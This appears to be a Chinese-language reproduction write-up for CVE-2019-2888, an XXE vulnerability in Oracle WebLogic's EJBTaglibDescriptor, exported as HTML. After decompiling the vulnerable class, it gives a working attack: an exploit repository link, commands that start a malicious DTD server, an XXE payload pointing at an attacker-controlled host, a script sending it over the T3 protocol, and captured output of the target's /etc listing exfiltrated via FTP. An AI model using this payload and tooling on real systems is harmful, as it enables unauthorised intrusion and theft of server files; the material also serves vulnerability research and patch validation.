<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>（CVE-2019-2888）Weblogic EJBTaglibDescriptor XXE漏洞</h1><h2>一、漏洞简介</h2><h2>二、漏洞影响</h2><p>Weblogic Server 10.3.6.0.0版本、12.1.3.0.0版本和12.2.1.3.0版本的EJB Container组件存在安全漏洞</p><h2>三、复现过程</h2><h3>fernflower.jar</h3><p>weblogic.jar/weblogic/servlet/ejb2jsp/dd/EJBTaglibDescriptor.class<br />╭─root@jas502n /var <br />╰─# find ./ |grep EJBTaglibDescriptor                                                                       ✔  8388  18:32:43 <br />.//weblogic.jar/weblogic/servlet/ejb2jsp/dd/EJBTaglibDescriptor.class<br />.//weblogic.jar/weblogic/servlet/ejb2jsp/gui/EJBTaglibDescriptorTree.class<br />.//weblogic.jar/weblogic/servlet/ejb2jsp/gui/EJBTaglibDescriptorPanel.class<br />╭─root@jas502n /var <br />╰─# ls                                                                                                      ✔  8392  18:33:22 <br />EJBTaglibDescriptor.java fernflower.jar           weblogic.jar</p><h4><em>EJBTaglibDescriptor.class to EJBTaglibDescriptor.java</em></h4><p>╭─root@jas502n /var <br />╰─# java -jar fernflower.jar .//weblogic.jar/weblogic/servlet/ejb2jsp/dd/EJBTaglibDescriptor.class ./<br /> ./<br />INFO:  Decompiling class weblogic/servlet/ejb2jsp/dd/EJBTaglibDescriptor<br />INFO:  ... done<br />╭─root@jas502n /var <br />╰─# ls            <br />EJBTaglibDescriptor.java fernflower.jar           weblogic.jar</p><h4><em>cat EJBTaglibDescriptor.java</em></h4><p>╭─root@jas502n /var <br />╰─# cat EJBTaglibDescriptor.java<br /><br />package weblogic.servlet.ejb2jsp.dd;<br /><br />import java.io.Externalizable;<br />import java.io.File;<br />import java.io.FileInputStream;<br />import java.io.IOException;<br />import java.io.InputStreamReader;<br />import java.io.ObjectInput;<br />import java.io.ObjectOutput;<br />import java.io.Reader;<br />import java.io.StringReader;<br />import java.io.StringWriter;<br />import java.util.ArrayList;<br />import java.util.Collection;<br />import java.util.Enumeration;<br />import java.util.Iterator;<br />import java.util.List;<br />import javax.xml.parsers.DocumentBuilder;<br />import org.w3c.dom.Element;<br />import org.xml.sax.InputSource;<br />import weblogic.servlet.ejb2jsp.BeanGenerator;<br />import weblogic.servlet.ejb2jsp.EJBMethodGenerator;<br />import weblogic.servlet.ejb2jsp.EJBTaglibGenerator;<br />import weblogic.servlet.ejb2jsp.HomeCollectionGenerator;<br />import weblogic.servlet.ejb2jsp.HomeFinderGenerator;<br />import weblogic.servlet.ejb2jsp.HomeMethodGenerator;<br />import weblogic.servlet.internal.dd.ToXML;<br />import weblogic.utils.Getopt2;<br />import weblogic.utils.classloaders.ClasspathClassLoader;<br />import weblogic.utils.io.XMLWriter;<br />import weblogic.xml.dom.DOMProcessingException;<br />import weblogic.xml.dom.DOMUtils;<br />import weblogic.xml.jaxp.WebLogicDocumentBuilderFactory;<br /><br />public class EJBTaglibDescriptor implements ToXML, Externalizable {<br />   private static final long serialVersionUID = -9016538269900747655L;<br />   private FilesystemInfoDescriptor fileInfo;<br />   private BeanDescriptor[] beans;<br />   private transient ClassLoader jarLoader;<br />   private static final String PREAMBLE = "&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\" ?&gt;\n&lt;!DOCTYPE ejb2jsp-taglib PUBLIC \"-//BEA Systems, Inc.//DTD EJB2JSP Taglib 1.0//EN\" \"http://www.bea.com/servers/wls600/dtd/weblogic-ejb2jsp.dtd\"&gt;";<br /><br />   static void p(String var0) {<br />      System.err.println("[EJBTagDesc]: " + var0);<br />   }</p><h3>漏洞利用</h3><p><strong>下载python xxer</strong></p><p>https://github.com/ianxtianxt/CVE-2019-2888</p><p>info: Starting xxer_httpd on port 8989<br /><br />info: Starting xxer_ftpd on port 2121<br /><br />http://10.10.20.100:8989/ext.dtd</p><p>python xxer.py -p 8989 -H 10.10.20.100<br /><br /> _ _ _ _ ___ ___<br />|_'_|_'_| -_|  _|<br />|_,_|_,_|___|_|<br /><br />version 1.1<br /><br />info: Old DTD found. This file is going to be deleted.<br />info: Generating new DTD file.<br />info: Starting xxer_httpd on port 8989<br />info: Starting xxer_ftpd on port 2121<br />info: Servers started. Use the following payload (with URL-encoding):<br /><br />&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE xmlrootname [&lt;!ENTITY % aaa SYSTEM "http://10.10.20.100:8989/ext.dtd"&gt;%aaa;%ccc;%ddd;]&gt;</p><p><strong>通过T3协议，发送序列化后的xml payload</strong></p><p>ale@Pentest: ~/Desktop/CVE-2019-2888# python weblogic.py 10.10.20.100 7001                                                 <br /><br /><br /> _       __     __    __            _         _  ___  __ ______<br />| |     / /__  / /_  / /___  ____ _(_)____   | |/ / |/ // ____/<br />| | /| / / _ \/ __ \/ / __ \/ __ `/ / ___/   |   /|   // __/<br />| |/ |/ /  __/ /_/ / / /_/ / /_/ / / /__    /   |/   |/ /___<br />|__/|__/\___/_.___/_/\____/\__, /_/\___/   /_/|_/_/|_/_____/<br />                          /____/<br /><br />     CVE-2019-2888 WebLogic EJBTaglibDescriptor XXE漏洞<br /><br />                  python By jas502n<br /><br /><br /><br />[+] XXE_IP= 10.10.20.166<br />[+] XXE_IP= 8989<br />[+] http://10.10.20.166:8989/ext.dtd<br /><br />connecting to 10.10.20.100 port 7001<br />sending "t3 12.2.1<br />AS:255<br />HL:19<br />MS:10000000<br />PU:t3://us-l-breens:7001<br /><br />"<br />received "HELO"<br />sending payload...<br /><br />ale@Pentest: ~/Desktop/CVE-2019-2888#</p><p><strong>get /etc dir info</strong></p><p>root@kali:~/xxer# python xxer.py -p 8989 -H 10.10.20.166<br /><br /> _ _ _ _ ___ ___<br />|_'_|_'_| -_|  _|<br />|_,_|_,_|___|_|<br /><br />version 1.1<br /><br />info: Old DTD found. This file is going to be deleted.<br />info: Generating new DTD file.<br />info: Starting xxer_httpd on port 8989<br />info: Starting xxer_ftpd on port 2121<br />info: Servers started. Use the following payload (with URL-encoding):<br /><br />&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE xmlrootname [&lt;!ENTITY % aaa SYSTEM "http://10.10.20.166:8989/ext.dtd"&gt;%aaa;%ccc;%ddd;]&gt;<br /><br /><br />10.10.20.100 - - [01/Nov/2019 12:58:42] "GET /ext.dtd HTTP/1.1" 200 -<br />info: FTP: recvd 'USER fakeuser'<br />info: FTP: recvd 'PASS .pwd.lock<br />adduser.conf<br />alternatives<br />apparmor<br />apparmor.d<br />apt<br />bash_completion.d<br />bash.bashrc<br />bindresvport.blacklist<br />blkid.conf<br />blkid.tab<br />ca-certificates<br />ca-certificates.conf<br />console-setup<br />cron.d<br />cron.daily<br />cron.hourly<br />cron.monthly<br />cron.weekly<br />crontab<br />dbus-1<br />debconf.conf<br />debian_version</p></body></html>